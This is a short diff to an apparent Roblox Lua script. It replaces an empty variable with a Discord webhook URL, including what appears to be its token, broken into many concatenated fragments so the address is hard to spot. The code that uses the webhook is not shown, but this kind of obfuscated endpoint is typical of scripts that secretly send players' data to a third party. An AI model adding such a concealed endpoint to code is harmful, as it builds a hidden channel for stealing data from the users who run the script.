@@ -1,7 +1,13 @@
 repeat wait() until game:IsLoaded()
 local check = nil
 local sttsc = false
-local bobby = "" 
+local bobby = "ht".."tps".."://dis"..
+"cor".."d.com".."/ap".."i/we"..
+"bho".."oks/104".."39900".."37206"..
+"929438/cv7".."DCc".."G6y".."0Us"..
+"Y1VR".."q7vi".."QB-yP7k_Sk9"..
+"3ajUL".."ndbW".."7sIOu".."Mze7O"..
+"qe38LU".."tjlBkP".."SDxoeU"
 local TIME_ZONE = 1
 local date = os.date("!*t")
 local hour = (date.hour + TIME_ZONE) % 24
